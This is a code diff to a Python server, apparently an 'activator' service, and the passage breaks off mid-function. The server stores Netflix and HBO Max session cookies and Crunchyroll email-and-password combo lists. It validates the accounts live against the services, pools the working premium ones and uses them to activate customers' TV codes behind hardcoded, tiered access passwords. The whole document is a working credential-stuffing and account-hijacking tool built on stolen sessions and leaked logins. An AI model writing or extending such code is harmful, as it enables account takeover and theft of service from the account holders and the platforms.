@@ -24,14 +24,17 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 NETFLIX_COOKIES_FOLDER = os.path.join(BASE_DIR, "netflix")
 HBO_COOKIES_FOLDER = os.path.join(BASE_DIR, "hbomax")
+CRUNCHYROLL_COMBO_FOLDER = os.path.join(BASE_DIR, "combo")
 USED_REGISTRY_FILE = os.path.join(BASE_DIR, "used_cookies.json")
 COOKIES_BUNDLE_FILE = os.path.join(BASE_DIR, "cookies_bundle.json")
 PORT = int(os.environ.get("PORT", 5000))
+SERVER_DATA_VERSION = time.time()
 
 def sync_cookies_bundle():
-    """Garante suporte total às pastas netflix e hbomax (com retrocompatibilidade para cookies e cookies 01)."""
+    """Garante suporte total às pastas netflix, hbomax e combo."""
     os.makedirs(NETFLIX_COOKIES_FOLDER, exist_ok=True)
     os.makedirs(HBO_COOKIES_FOLDER, exist_ok=True)
+    os.makedirs(CRUNCHYROLL_COMBO_FOLDER, exist_ok=True)
     
     # Migra automaticamente arquivos antigos se existirem
     old_netflix = os.path.join(BASE_DIR, "cookies")
@@ -73,11 +76,17 @@ def sync_cookies_bundle():
                 if not os.path.exists(dest):
                     with open(dest, 'w', encoding='utf-8', errors='ignore') as out:
                         out.write(content)
+
+            for fname, content in data.get("crunchyroll", {}).items():
+                dest = os.path.join(CRUNCHYROLL_COMBO_FOLDER, fname)
+                if not os.path.exists(dest):
+                    with open(dest, 'w', encoding='utf-8', errors='ignore') as out:
+                        out.write(content)
         except Exception:
             pass
 
     # 2. Salva todos os cookies locais no arquivo único cookies_bundle.json
-    bundle = {"netflix": {}, "hbo": {}}
+    bundle = {"netflix": {}, "hbo": {}, "crunchyroll": {}}
     for n_dir in [NETFLIX_COOKIES_FOLDER, old_netflix]:
         if os.path.exists(n_dir):
             for f in glob.glob(os.path.join(n_dir, "*.txt")) + glob.glob(os.path.join(n_dir, "*.json")):
@@ -96,7 +105,15 @@ def sync_cookies_bundle():
                 except Exception:
                     pass
 
-    if bundle["netflix"] or bundle["hbo"]:
+    if os.path.exists(CRUNCHYROLL_COMBO_FOLDER):
+        for f in glob.glob(os.path.join(CRUNCHYROLL_COMBO_FOLDER, "*.txt")):
+            try:
+                with open(f, 'r', encoding='utf-8', errors='ignore') as inf:
+                    bundle["crunchyroll"][os.path.basename(f)] = inf.read()
+            except Exception:
+                pass
+
+    if bundle["netflix"] or bundle["hbo"] or bundle["crunchyroll"]:
         try:
             with open(COOKIES_BUNDLE_FILE, 'w', encoding='utf-8', errors='ignore') as outf:
                 json.dump(bundle, outf)
@@ -158,13 +175,14 @@ def record_history_entry(service: str, filename: str, email: str, tv_code: str, 
 import tv2
 
 USED_NETFLIX_COOKIES = tv2.USED_COOKIES
-ACTIVE_PLAN = {"netflix": "TODOS", "hbo": "TODOS"}
+ACTIVE_PLAN = {"netflix": "TODOS", "hbo": "TODOS", "crunchyroll": "TODOS"}
 
 # Cache de cookies testados e validados ao vivo
 VALID_NETFLIX_LOCK = threading.Lock()
 VALID_NETFLIX_BY_FILE: Dict[str, dict] = {}
 VALID_NETFLIX_POOL: List[dict] = []
 DEAD_NETFLIX_COOKIES: Set[str] = set()
+COOKIE_FAIL_COUNTS: Dict[str, int] = {}
 
 # HBO Valid Pool
 VALID_HBO_LOCK = threading.Lock()
@@ -202,16 +220,20 @@ def test_netflix_cookie_file(fpath: str, timeout: float = 4.0) -> Optional[dict]
         with open(fpath, 'r', encoding='utf-8', errors='ignore') as f:
             raw = f.read()
         parsed = tv2.load_cookies(raw)
-        if not parsed or "SecureNetflixId" not in parsed:
+        if not parsed or not any(k in parsed for k in ["NetflixId", "SecureNetflixId"]):
             DEAD_NETFLIX_COOKIES.add(fpath)
             return None
 
         # Validação real contra os servidores da Netflix
         acc_info = tv2.check_account(parsed, timeout=timeout)
         if not acc_info:
-            DEAD_NETFLIX_COOKIES.add(fpath)
+            # Tolerância contra rate-limit transitório de rede: não descarta sumariamente no primeiro erro
+            COOKIE_FAIL_COUNTS[fpath] = COOKIE_FAIL_COUNTS.get(fpath, 0) + 1
+            if COOKIE_FAIL_COUNTS[fpath] >= 3:
+                DEAD_NETFLIX_COOKIES.add(fpath)
             return None
 
+        COOKIE_FAIL_COUNTS[fpath] = 0
         cat = classify_plan(bname, acc_info.get("plan", ""))
         acc_info["category"] = cat
 
@@ -229,7 +251,9 @@ def test_netflix_cookie_file(fpath: str, timeout: float = 4.0) -> Optional[dict]
 
         return entry
     except Exception:
-        DEAD_NETFLIX_COOKIES.add(fpath)
+        COOKIE_FAIL_COUNTS[fpath] = COOKIE_FAIL_COUNTS.get(fpath, 0) + 1
+        if COOKIE_FAIL_COUNTS[fpath] >= 3:
+            DEAD_NETFLIX_COOKIES.add(fpath)
         return None
 
 def extract_netflix_file_info(fpath: str) -> Optional[dict]:
@@ -245,7 +269,7 @@ def extract_netflix_file_info(fpath: str) -> Optional[dict]:
             raw = f.read()
 
         parsed = tv2.load_cookies(raw)
-        if not parsed or "SecureNetflixId" not in parsed:
+        if not parsed or not any(k in parsed for k in ["NetflixId", "SecureNetflixId"]):
             return None
 
         email = ""
@@ -331,9 +355,9 @@ def get_all_netflix_accounts() -> List[dict]:
     return accounts
 
 def start_background_netflix_validator():
-    """Valida em segundo plano os cookies restantes da pasta de forma suave."""
+    """Valida em segundo plano os cookies restantes da pasta de forma suave sem derrubar conexões."""
     def _worker():
-        time.sleep(2)
+        time.sleep(15)
         while True:
             files = get_netflix_files()
             for f in files:
@@ -344,11 +368,11 @@ def start_background_netflix_validator():
                     if f in VALID_NETFLIX_BY_FILE:
                         continue
                 try:
-                    test_netflix_cookie_file(f, timeout=4.0)
+                    test_netflix_cookie_file(f, timeout=3.5)
                 except Exception:
                     pass
-                time.sleep(1.5)
-            time.sleep(60)
+                time.sleep(3.0)
+            time.sleep(180)
 
     t = threading.Thread(target=_worker, daemon=True)
     t.start()
@@ -836,6 +860,222 @@ def select_hbo_cookie_by_filename(filename: str) -> Optional[dict]:
         return None
 
 # ═══════════════════════════════════════════════════════════════
+#  INTEGRAÇÃO CRUNCHYROLL (MOTOR COMBO & TV ACTIVATION REAL)
+# ═══════════════════════════════════════════════════════════════
+import crunchyroll
+
+CRUNCHYROLL_COMBO_FOLDER = os.path.join(BASE_DIR, "combo")
+os.makedirs(CRUNCHYROLL_COMBO_FOLDER, exist_ok=True)
+
+VALID_CRUNCHYROLL_LOCK = threading.Lock()
+VALID_CRUNCHYROLL_BY_EMAIL: Dict[str, dict] = {}
+VALID_CRUNCHYROLL_POOL: List[dict] = []
+DEAD_CRUNCHYROLL_ACCOUNTS: Set[str] = set()
+USED_CRUNCHYROLL_ACCOUNTS = crunchyroll.USED_COMBOS
+
+def get_all_crunchyroll_accounts() -> List[dict]:
+    """Retorna todas as contas Crunchyroll dos combos com metadados rápidos."""
+    combos = crunchyroll.load_combos(CRUNCHYROLL_COMBO_FOLDER)
+    accounts = []
+    seen = set()
+
+    for email, pwd, fname in combos:
+        if email in seen:
+            continue
+        seen.add(email)
+
+        if email in USED_CRUNCHYROLL_ACCOUNTS or email in DEAD_CRUNCHYROLL_ACCOUNTS:
+            continue
+
+        with VALID_CRUNCHYROLL_LOCK:
+            if email in VALID_CRUNCHYROLL_BY_EMAIL and email not in DEAD_CRUNCHYROLL_ACCOUNTS:
+                accounts.append(VALID_CRUNCHYROLL_BY_EMAIL[email])
+                continue
+
+        accounts.append({
+            "file": fname,
+            "email": email,
+            "password": pwd,
+            "info": {
+                "email": email,
+                "plan": "Crunchyroll VIP",
+                "country": "BR"
+            },
+            "validated": False
+        })
+    return accounts
+
+def test_crunchyroll_account(email: str, pwd: str, fname: str) -> Optional[dict]:
+    """Valida ao vivo uma conta Crunchyroll nos servidores oficiais."""
+    if email in USED_CRUNCHYROLL_ACCOUNTS or email in DEAD_CRUNCHYROLL_ACCOUNTS:
+        return None
+
+    with VALID_CRUNCHYROLL_LOCK:
+        if email in VALID_CRUNCHYROLL_BY_EMAIL and email not in DEAD_CRUNCHYROLL_ACCOUNTS:
+            entry = VALID_CRUNCHYROLL_BY_EMAIL[email]
+            if entry.get("exp", 0) > time.time() + 120:
+                return entry
+
+    session = crunchyroll.make_session()
+    try:
+        res = crunchyroll.check_account(session, email, pwd)
+        status = res.get("status")
+
+        if status == "premium":
+            entry = {
+                "file": fname,
+                "email": email,
+                "password": pwd,
+                "access_token": res["access_token"],
+                "exp": res.get("exp", int(time.time() + 3600)),
+                "info": {
+                    "email": email,
+                    "plan": res.get("plan", "Crunchyroll FAN"),
+                    "country": res.get("country", "BR"),
+                    "benefits": res.get("benefits", [])
+                },
+                "validated": True
+            }
+            with VALID_CRUNCHYROLL_LOCK:
+                VALID_CRUNCHYROLL_BY_EMAIL[email] = entry
+                found = False
+                for idx, e in enumerate(VALID_CRUNCHYROLL_POOL):
+                    if e["email"] == email:
+                        VALID_CRUNCHYROLL_POOL[idx] = entry
+                        found = True
+                        break
+                if not found:
+                    VALID_CRUNCHYROLL_POOL.append(entry)
+            return entry
+        elif status in ["bad", "free"]:
+            DEAD_CRUNCHYROLL_ACCOUNTS.add(email)
+            return None
+        else:
+            return None
+    except Exception:
+        return None
+    finally:
+        session.close()
+
+def find_crunchyroll_valid_account() -> Optional[dict]:
+    """Retorna uma conta Crunchyroll premium válida e com token ativo pronta para a TV."""
+    now = time.time()
+    with VALID_CRUNCHYROLL_LOCK:
+        for entry in list(VALID_CRUNCHYROLL_POOL):
+            email = entry["email"]
+            if email in USED_CRUNCHYROLL_ACCOUNTS or email in DEAD_CRUNCHYROLL_ACCOUNTS:
+                continue
+            if entry.get("exp", 0) > now + 60:
+                return entry
+
+    combos = crunchyroll.load_combos(CRUNCHYROLL_COMBO_FOLDER)
+    for email, pwd, fname in combos:
+        if email in USED_CRUNCHYROLL_ACCOUNTS or email in DEAD_CRUNCHYROLL_ACCOUNTS:
+            continue
+        valid = test_crunchyroll_account(email, pwd, fname)
+        if valid:
+            return valid
+
+    return None
+
+def select_crunchyroll_account_by_identifier(identifier: str) -> Optional[dict]:
+    """Busca conta específica por email ou arquivo e a valida."""
+    combos = crunchyroll.load_combos(CRUNCHYROLL_COMBO_FOLDER)
+    target = identifier.strip().lower()
+    # 1. Busca exata por email primeiro
+    for email, pwd, fname in combos:
+        if email.strip().lower() == target:
+            valid = test_crunchyroll_account(email, pwd, fname)
+            if valid:
+                return valid
+    # 2. Busca por nome do arquivo
+    for email, pwd, fname in combos:
+        if fname.strip().lower() == target:
+            valid = test_crunchyroll_account(email, pwd, fname)
+            if valid:
+                return valid
+    # 3. Busca parcial por email
+    for email, pwd, fname in combos:
+        if target in email.strip().lower():
+            valid = test_crunchyroll_account(email, pwd, fname)
+            if valid:
+                return valid
+    return None
+
+def activate_crunchyroll_tv(tv_code: str, account_data: dict) -> Tuple[bool, str, Optional[dict]]:
+    """Envia código de ativação da TV para a Crunchyroll."""
+    clean_code = re.sub(r'[^A-Za-z0-9]', '', tv_code).upper()
+    if len(clean_code) < 6:
+        return False, "O código de ativação da TV deve ter no mínimo 6 caracteres.", None
+
+    if not account_data or "email" not in account_data:
+        return False, "Nenhuma credencial válida da Crunchyroll encontrada.", None
+
+    # Sempre obtém ou valida um token fresco diretamente com a Crunchyroll antes do envio
+    session = crunchyroll.make_session()
+    try:
+        fresh_login = crunchyroll.check_account(session, account_data["email"], account_data["password"])
+        if fresh_login.get("status") == "premium" and fresh_login.get("access_token"):
+            account_data["access_token"] = fresh_login["access_token"]
+            account_data["exp"] = fresh_login.get("exp", int(time.time() + 3600))
+            if "info" in account_data:
+                account_data["info"]["plan"] = fresh_login.get("plan", account_data["info"].get("plan"))
+                account_data["info"]["country"] = fresh_login.get("country", account_data["info"].get("country"))
+    except Exception:
+        pass
+    finally:
+        session.close()
+
+    if not account_data.get("access_token"):
+        return False, "Não foi possível obter uma sessão ativa da Crunchyroll. Verifique seus combos.", None
+
+    success, msg, info_resp = crunchyroll.ativar_tv(account_data["access_token"], clean_code)
+
+    # Se falhou por motivo de token, 401 ou 403, tenta re-autenticar de imediato
+    if not success and any(k in msg.lower() for k in ["token", "sessão", "401", "403"]):
+        session = crunchyroll.make_session()
+        try:
+            retry_login = crunchyroll.check_account(session, account_data["email"], account_data["password"])
+            if retry_login.get("status") == "premium" and retry_login.get("access_token"):
+                account_data["access_token"] = retry_login["access_token"]
+                retry_success, retry_msg, _ = crunchyroll.ativar_tv(account_data["access_token"], clean_code)
+                if retry_success:
+                    return True, retry_msg, account_data["info"]
+                else:
+                    msg = retry_msg
+        except Exception:
+            pass
+        finally:
+            session.close()
+
+    if success:
+        return True, msg, account_data["info"]
+    else:
+        return False, msg, None
+
+def get_verified_crunchyroll_accounts(min_count: int = 1) -> List[dict]:
+    return get_all_crunchyroll_accounts()
+
+def start_background_crunchyroll_validator():
+    """Validador em background para manter sempre contas Crunchyroll prontas."""
+    def _worker():
+        global CURRENT_CRUNCHYROLL_READY
+        time.sleep(2)
+        while True:
+            try:
+                acc = find_crunchyroll_valid_account()
+                if acc and CURRENT_CRUNCHYROLL_READY is None:
+                    CURRENT_CRUNCHYROLL_READY = acc
+            except Exception:
+                pass
+            time.sleep(45)
+
+    t = threading.Thread(target=_worker, daemon=True)
+    t.start()
+
+start_background_crunchyroll_validator()
+
+# ═══════════════════════════════════════════════════════════════
 #  SERVIDOR HTTP & API REST
 # ═══════════════════════════════════════════════════════════════
 # ═══════════════════════════════════════════════════════════════
@@ -846,7 +1086,7 @@ def get_master_password() -> str:
     env_pass = os.environ.get("MASTER_PASSWORD")
     if env_pass:
         return env_pass.strip()
-    return "CYBER#ROOT@9821$MATRIX*SECURE!2026"
+    return "ATIVADOR#MASTER@2026$STREAM*VIP!"
 
 def get_cookie_admin_password() -> str:
     env_pass = os.environ.get("COOKIE_ADMIN_PASSWORD")
@@ -857,7 +1097,83 @@ def get_cookie_admin_password() -> str:
 MASTER_PASSWORD = get_master_password()
 COOKIE_ADMIN_PASSWORD = get_cookie_admin_password()
 TOKEN_TTL_SECONDS = int(os.environ.get("TOKEN_TTL_SECONDS", 86400)) # 24 Horas de validade por token
-ACTIVE_SESSIONS: Dict[str, float] = {} # token -> expiry_timestamp
+CONFIG_SENHAS_FILE = os.path.join(BASE_DIR, "config_senhas.json")
+
+# Estrutura padrão de senhas e permissões
+DEFAULT_ACCESS_CONFIG = {
+    "senhas": [
+        {
+            "senha": get_master_password(),
+            "nome": "Master Total (Tudo Liberado)",
+            "servicos": ["netflix", "hbo", "crunchyroll"],
+            "descricao": "Desbloqueia Netflix, HBO Max e Crunchyroll"
+        },
+        {
+            "senha": "VIP#TOTAL",
+            "nome": "Acesso VIP Completo",
+            "servicos": ["netflix", "hbo", "crunchyroll"],
+            "descricao": "Desbloqueia Netflix, HBO Max e Crunchyroll"
+        },
+        {
+            "senha": "PASS#STREAM",
+            "nome": "Netflix + HBO Max",
+            "servicos": ["netflix", "hbo"],
+            "descricao": "Desbloqueia Netflix e HBO Max (Crunchyroll bloqueada com cadeado)"
+        },
+        {
+            "senha": "PASS#NETFLIX",
+            "nome": "Apenas Netflix",
+            "servicos": ["netflix"],
+            "descricao": "Desbloqueia apenas a Netflix"
+        },
+        {
+            "senha": "PASS#HBO",
+            "nome": "Apenas HBO Max",
+            "servicos": ["hbo"],
+            "descricao": "Desbloqueia apenas a HBO Max"
+        },
+        {
+            "senha": "PASS#CRUNCHYROLL",
+            "nome": "Apenas Crunchyroll",
+            "servicos": ["crunchyroll"],
+            "descricao": "Desbloqueia apenas a Crunchyroll"
+        }
+    ]
+}
+
+def load_access_keys() -> List[dict]:
+    """Carrega dinamicamente a lista de senhas e seus serviços permitidos."""
+    if not os.path.exists(CONFIG_SENHAS_FILE):
+        try:
+            with open(CONFIG_SENHAS_FILE, 'w', encoding='utf-8') as f:
+                json.dump(DEFAULT_ACCESS_CONFIG, f, indent=2, ensure_ascii=False)
+        except Exception:
+            pass
+        return DEFAULT_ACCESS_CONFIG["senhas"]
+
+    try:
+        with open(CONFIG_SENHAS_FILE, 'r', encoding='utf-8') as f:
+            data = json.load(f)
+            return data.get("senhas", DEFAULT_ACCESS_CONFIG["senhas"])
+    except Exception:
+        return DEFAULT_ACCESS_CONFIG["senhas"]
+
+def find_access_role(password: str) -> Optional[dict]:
+    """Busca a configuração de acesso correspondente à senha informada."""
+    keys = load_access_keys()
+    p_clean = password.strip()
+    for item in keys:
+        if hmac.compare_digest(p_clean, item.get("senha", "").strip()):
+            return item
+    if hmac.compare_digest(p_clean, get_master_password().strip()):
+        return {
+            "senha": get_master_password(),
+            "nome": "Master Total",
+            "servicos": ["netflix", "hbo", "crunchyroll"]
+        }
+    return None
+
+ACTIVE_SESSIONS: Dict[str, dict] = {} # token -> {"exp": float, "services": list, "role_name": str}
 ACTIVE_ADMIN_SESSIONS: Dict[str, float] = {} # admin_token -> expiry_timestamp
 SESSION_CACHE_FILE = os.path.join(BASE_DIR, ".session_cache.json")
 
@@ -868,7 +1184,15 @@ def load_active_sessions():
             with open(SESSION_CACHE_FILE, 'r', encoding='utf-8') as f:
                 data = json.load(f)
                 now = time.time()
-                ACTIVE_SESSIONS = {t: float(exp) for t, exp in data.items() if float(exp) > now}
+                clean = {}
+                for t, val in data.items():
+                    if isinstance(val, (int, float)):
+                        if val > now:
+                            clean[t] = {"exp": float(val), "services": ["netflix", "hbo", "crunchyroll"], "role_name": "Master Total"}
+                    elif isinstance(val, dict):
+                        if val.get("exp", 0) > now:
+                            clean[t] = val
+                ACTIVE_SESSIONS = clean
         except Exception:
             pass
 
@@ -887,28 +1211,30 @@ ACTIVATION_RATE_LIMIT: Dict[str, list] = {} # ip -> list of timestamps
 
 CURRENT_NETFLIX_READY: Optional[dict] = None
 CURRENT_HBO_READY: Optional[dict] = None
+CURRENT_CRUNCHYROLL_READY: Optional[dict] = None
 
 class AppRequestHandler(SimpleHTTPRequestHandler):
     def send_security_headers(self):
-        """Cabeçalhos avançados de proteção contra XSS, Clickjacking, MIME-sniffing e Injeções."""
-        self.send_header('Cache-Control', 'no-cache, no-store, must-revalidate')
+        """Cabeçalhos avançados de proteção contra XSS, Clickjacking, MIME-sniffing, Injeções e Cache."""
+        self.send_header('Cache-Control', 'no-cache, no-store, must-revalidate, max-age=0')
         self.send_header('Pragma', 'no-cache')
         self.send_header('Expires', '0')
         self.send_header('X-Content-Type-Options', 'nosniff')
-        self.send_header('X-Frame-Options', 'DENY')
+        self.send_header('X-Frame-Options', 'SAMEORIGIN')
         self.send_header('X-XSS-Protection', '1; mode=block')
         self.send_header('Referrer-Policy', 'strict-origin-when-cross-origin')
         self.send_header('Content-Security-Policy', "default-src 'self' 'unsafe-inline' 'unsafe-eval' https://fonts.googleapis.com https://fonts.gstatic.com data:; font-src 'self' https://fonts.gstatic.com data:; img-src 'self' data: https:;")
         self.send_header('Access-Control-Allow-Origin', '*')
         self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
-        self.send_header('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-Auth-Token')
+        self.send_header('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-Auth-Token, X-Admin-Token, X-Admin-Pass, X-Requested-With')
+        self.send_header('Access-Control-Max-Age', '86400')
 
     def end_headers(self):
         self.send_security_headers()
         super().end_headers()
 
     def do_OPTIONS(self):
-        self.send_response(200)
+        self.send_response(204)
         self.end_headers()
 
     def get_client_ip(self):
@@ -917,7 +1243,7 @@ class AppRequestHandler(SimpleHTTPRequestHandler):
             return xff.split(',')[0].strip()
         return self.client_address[0] if self.client_address else "127.0.0.1"
 
-    def is_authenticated(self):
+    def get_session_info(self) -> Optional[dict]:
         auth_header = self.headers.get('Authorization', '')
         token = ''
         if auth_header.startswith('Bearer '):
@@ -926,22 +1252,32 @@ class AppRequestHandler(SimpleHTTPRequestHandler):
             token = self.headers.get('X-Auth-Token', '').strip()
         
         if not token:
-            return False
+            return None
 
         now = time.time()
         with LOGIN_LOCK:
-            # Limpeza automática de tokens expirados
-            expired = [t for t, exp in ACTIVE_SESSIONS.items() if exp < now]
+            expired = [t for t, s_data in ACTIVE_SESSIONS.items() if s_data.get("exp", 0) < now]
             for exp_token in expired:
                 ACTIVE_SESSIONS.pop(exp_token, None)
 
             if token in ACTIVE_SESSIONS:
-                if ACTIVE_SESSIONS[token] > now:
-                    return True
+                s_data = ACTIVE_SESSIONS[token]
+                if s_data.get("exp", 0) > now:
+                    return s_data
                 else:
                     ACTIVE_SESSIONS.pop(token, None)
-                    return False
+                    return None
+            return None
+
+    def is_authenticated(self):
+        return self.get_session_info() is not None
+
+    def is_service_allowed(self, service: str) -> bool:
+        session = self.get_session_info()
+        if not session:
             return False
+        services = session.get("services", ["netflix", "hbo", "crunchyroll"])
+        return service in services
 
     def is_admin_authenticated(self):
         # 1. Se o usuário já autenticou com a senha mestre no terminal, concede acesso direto!
@@ -1023,20 +1359,27 @@ class AppRequestHandler(SimpleHTTPRequestHandler):
         req = json.loads(post_data.decode('utf-8')) if post_data else {}
         password = req.get('password', '').strip()
 
-        # Comparação em tempo constante para evitar Timing Attacks
-        is_valid = hmac.compare_digest(password, get_master_password())
+        role = find_access_role(password)
 
         with LOGIN_LOCK:
-            if is_valid:
+            if role is not None:
                 LOGIN_ATTEMPTS.pop(ip, None)
                 new_token = secrets.token_hex(32)
-                ACTIVE_SESSIONS[new_token] = now + TOKEN_TTL_SECONDS
+                allowed_services = role.get("servicos", ["netflix", "hbo", "crunchyroll"])
+                role_name = role.get("nome", "Acesso Autorizado")
+                ACTIVE_SESSIONS[new_token] = {
+                    "exp": now + TOKEN_TTL_SECONDS,
+                    "services": allowed_services,
+                    "role_name": role_name
+                }
                 save_active_sessions()
                 return self.send_json_response({
                     "success": True,
                     "token": new_token,
+                    "allowed_services": allowed_services,
+                    "role_name": role_name,
                     "expires_in": TOKEN_TTL_SECONDS,
-                    "message": "Terminal desbloqueado com sucesso."
+                    "message": f"Terminal desbloqueado ({role_name})."
                 })
             else:
                 record["count"] += 1
@@ -1062,7 +1405,7 @@ class AppRequestHandler(SimpleHTTPRequestHandler):
                     remaining = 5 - record["count"]
                     return self.send_json_response({
                         "success": False,
-                        "message": f"Senha mestre incorreta. Restam {remaining} tentativas antes do bloqueio temporário."
+                        "message": f"Senha incorreta. Restam {remaining} tentativas antes do bloqueio temporário."
                     }, 401)
 
     def handle_api_logout(self):
@@ -1078,13 +1421,30 @@ class AppRequestHandler(SimpleHTTPRequestHandler):
         return self.send_json_response({"success": True, "message": "Terminal bloqueado."})
 
     def handle_api_verify_token(self):
-        return self.send_json_response({"authenticated": self.is_authenticated()})
+        session = self.get_session_info()
+        if session:
+            return self.send_json_response({
+                "authenticated": True,
+                "allowed_services": session.get("services", ["netflix", "hbo", "crunchyroll"]),
+                "role_name": session.get("role_name", "Acesso Autorizado")
+            })
+        return self.send_json_response({"authenticated": False}, 401)
 
     def check_rate_limit(self, max_requests: int = 15, window_seconds: int = 30) -> bool:
-        """Rate limiting por IP para proteger endpoints sensíveis contra spam/DDoS."""
+        """Rate limiting por IP para proteger endpoints sensíveis contra spam/DDoS e vazamento de memória."""
         ip = self.get_client_ip()
         now = time.time()
         with LOGIN_LOCK:
+            # Limpeza preventiva periódica de IPs inativos para evitar vazamento de memória
+            if len(ACTIVATION_RATE_LIMIT) > 200:
+                expired_ips = [k for k, v in ACTIVATION_RATE_LIMIT.items() if not v or now - v[-1] > 3600]
+                for k in expired_ips:
+                    ACTIVATION_RATE_LIMIT.pop(k, None)
+            if len(LOGIN_ATTEMPTS) > 200:
+                expired_login = [k for k, v in LOGIN_ATTEMPTS.items() if now > v.get("blocked_until", 0) + 3600]
+                for k in expired_login:
+                    LOGIN_ATTEMPTS.pop(k, None)
+
             timestamps = ACTIVATION_RATE_LIMIT.get(ip, [])
             timestamps = [t for t in timestamps if now - t < window_seconds]
             if len(timestamps) >= max_requests:
@@ -1198,13 +1558,16 @@ class AppRequestHandler(SimpleHTTPRequestHandler):
         self.wfile.write(body)
 
     def handle_api_status(self):
-        global CURRENT_NETFLIX_READY, CURRENT_HBO_READY
+        global CURRENT_NETFLIX_READY, CURRENT_HBO_READY, CURRENT_CRUNCHYROLL_READY
 
         if CURRENT_NETFLIX_READY is None or (CURRENT_NETFLIX_READY and (CURRENT_NETFLIX_READY.get("file") in DEAD_NETFLIX_COOKIES or CURRENT_NETFLIX_READY.get("file") in tv2.USED_COOKIES)):
             CURRENT_NETFLIX_READY = find_netflix_valid_cookie()
         
         if CURRENT_HBO_READY is None or (CURRENT_HBO_READY and CURRENT_HBO_READY.get("file") in USED_HBO_COOKIES):
             CURRENT_HBO_READY = find_hbo_valid_cookie()
+
+        if CURRENT_CRUNCHYROLL_READY is None or (CURRENT_CRUNCHYROLL_READY and (CURRENT_CRUNCHYROLL_READY.get("email") in DEAD_CRUNCHYROLL_ACCOUNTS or CURRENT_CRUNCHYROLL_READY.get("email") in USED_CRUNCHYROLL_ACCOUNTS)):
+            CURRENT_CRUNCHYROLL_READY = find_crunchyroll_valid_account()
 
         all_netflix = get_all_netflix_accounts()
         active_nf_file = CURRENT_NETFLIX_READY["file"] if CURRENT_NETFLIX_READY else ""
@@ -1238,8 +1601,24 @@ class AppRequestHandler(SimpleHTTPRequestHandler):
             for e in all_hbo if os.path.basename(e["file"]) != active_hbo_bname
         ]
 
+        all_cr = get_all_crunchyroll_accounts()
+        active_cr_email = CURRENT_CRUNCHYROLL_READY["email"] if CURRENT_CRUNCHYROLL_READY else ""
+
+        cr_queue = [
+            {
+                "filename": e.get("file") or e.get("email", "combo"),
+                "email": e["info"].get("email", e.get("file", "Crunchyroll VIP")),
+                "country": e["info"].get("country", "BR"),
+                "plan": e["info"].get("plan", "Crunchyroll FAN"),
+                "is_selected": (e.get("email") == active_cr_email),
+                "is_verified": e.get("validated", False)
+            }
+            for e in all_cr if e.get("email") != active_cr_email
+        ]
+
         nf_count = len(all_netflix)
         hbo_count = len(all_hbo)
+        cr_count = len(all_cr)
 
         res = {
             "netflix": {
@@ -1258,23 +1637,45 @@ class AppRequestHandler(SimpleHTTPRequestHandler):
                 "cookie_name": os.path.basename(CURRENT_HBO_READY["file"]) if CURRENT_HBO_READY else None,
                 "cookie_queue": hbo_queue
             },
+            "crunchyroll": {
+                "total_in_vault": cr_count,
+                "available_count": cr_count,
+                "has_account": CURRENT_CRUNCHYROLL_READY is not None,
+                "account": CURRENT_CRUNCHYROLL_READY["info"] if CURRENT_CRUNCHYROLL_READY else None,
+                "cookie_name": CURRENT_CRUNCHYROLL_READY.get("email") if CURRENT_CRUNCHYROLL_READY else None,
+                "cookie_queue": cr_queue
+            },
             "local_ip": get_local_ip(),
             "port": PORT
         }
+
+        session = self.get_session_info()
+        res["allowed_services"] = session.get("services", ["netflix", "hbo", "crunchyroll"]) if session else ["netflix", "hbo", "crunchyroll"]
+        res["role_name"] = session.get("role_name", "Acesso Autorizado") if session else ""
+        res["server_version"] = SERVER_DATA_VERSION
+
         self.send_json_response(res)
 
     def handle_api_skip_cookie(self):
-        global CURRENT_NETFLIX_READY, CURRENT_HBO_READY
+        global CURRENT_NETFLIX_READY, CURRENT_HBO_READY, CURRENT_CRUNCHYROLL_READY
         content_length = int(self.headers.get('Content-Length', 0))
         post_data = self.rfile.read(content_length)
         req = json.loads(post_data.decode('utf-8')) if post_data else {}
         service = req.get('service', 'netflix')
+
+        if not self.is_service_allowed(service):
+            return self.send_json_response({"success": False, "message": "🔒 Você não tem acesso a esse conteúdo."}, 403)
 
         if service == 'netflix':
             if CURRENT_NETFLIX_READY:
                 DEAD_NETFLIX_COOKIES.add(CURRENT_NETFLIX_READY["file"])
                 tv2.USED_COOKIES.add(CURRENT_NETFLIX_READY["file"])
             CURRENT_NETFLIX_READY = find_netflix_fast_cookie()
+        elif service == 'crunchyroll':
+            if CURRENT_CRUNCHYROLL_READY:
+                DEAD_CRUNCHYROLL_ACCOUNTS.add(CURRENT_CRUNCHYROLL_READY["email"])
+                USED_CRUNCHYROLL_ACCOUNTS.add(CURRENT_CRUNCHYROLL_READY["email"])
+            CURRENT_CRUNCHYROLL_READY = find_crunchyroll_valid_account()
         else:
             if CURRENT_HBO_READY:
                 USED_HBO_COOKIES.add(CURRENT_HBO_READY["file"])
@@ -1283,7 +1684,7 @@ class AppRequestHandler(SimpleHTTPRequestHandler):
         self.handle_api_status()
 
     def handle_api_activate(self):
-        global CURRENT_NETFLIX_READY, CURRENT_HBO_READY
+        global CURRENT_NETFLIX_READY, CURRENT_HBO_READY, CURRENT_CRUNCHYROLL_READY
         content_length = int(self.headers.get('Content-Length', 0))
         post_data = self.rfile.read(content_length)
         try:
@@ -1292,6 +1693,15 @@ class AppRequestHandler(SimpleHTTPRequestHandler):
             return self.send_json_response({"success": False, "message": "JSON inválido na requisição."}, 400)
 
         service = req.get('service', 'netflix')
+
+        # 🔒 Bloqueio rigoroso se a senha não tiver acesso a este streaming
+        if not self.is_service_allowed(service):
+            s_name = "Crunchyroll" if service == 'crunchyroll' else ("HBO Max" if service == 'hbo' else "Netflix")
+            return self.send_json_response({
+                "success": False,
+                "message": f"🔒 VOCÊ NÃO TEM ACESSO A ESSE CONTEÚDO! ({s_name} bloqueado pela sua senha)."
+            }, 403)
+
         tv_code = req.get('code', '').strip()
 
         if not tv_code:
@@ -1362,14 +1772,58 @@ class AppRequestHandler(SimpleHTTPRequestHandler):
                     "success": False,
                     "message": msg
                 })
+
+        elif service == 'crunchyroll':
+            if CURRENT_CRUNCHYROLL_READY is None:
+                CURRENT_CRUNCHYROLL_READY = find_crunchyroll_valid_account()
+
+            if not CURRENT_CRUNCHYROLL_READY:
+                return self.send_json_response({
+                    "success": False,
